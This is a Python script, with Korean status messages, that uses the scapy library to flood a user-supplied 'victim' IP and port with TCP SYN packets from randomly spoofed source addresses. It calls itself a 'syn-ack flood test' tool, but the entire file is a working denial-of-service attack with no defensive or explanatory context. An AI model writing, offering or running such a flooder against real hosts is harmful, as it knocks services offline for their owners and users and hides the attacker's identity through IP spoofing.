from scapy.all import IP, TCP, send, RandIP
import time
import sys
import os

os.getcwd()

def syn_flood(target_ip, target_port, packet_count):
    print(f"victim {target_ip}:{target_port} 대상 SYN 패킷 전송 시작")
    
    for i in range(packet_count):
        ip_layer = IP(src=RandIP(), dst=target_ip)    
        tcp_layer = TCP(sport=5555, dport=target_port, flags="S")
        packet = ip_layer / tcp_layer
        send(packet, verbose=False)
        if (i + 1) % 100 == 0:
            print(f"- {i + 1}개의 패킷 전송 완료")

if __name__ == "__main__":
    print("== syn-ack flood test ==\n\nsyn-ack flood 테스트 툴\n\'Ctrl + C\' 로 종료\n\n")
    
    try:
        TARGET_IP = input("victim ip : ")
        TARGET_PORT = int(input("victim port : "))
        PACKET_COUNT = int(input("send packet count : "))
        syn_flood(TARGET_IP, TARGET_PORT, PACKET_COUNT)
    except KeyboardInterrupt:
        print("\n사용자에 의해 종료됨")
        sys.exit(0)
    
    print("체계를 끕니다")

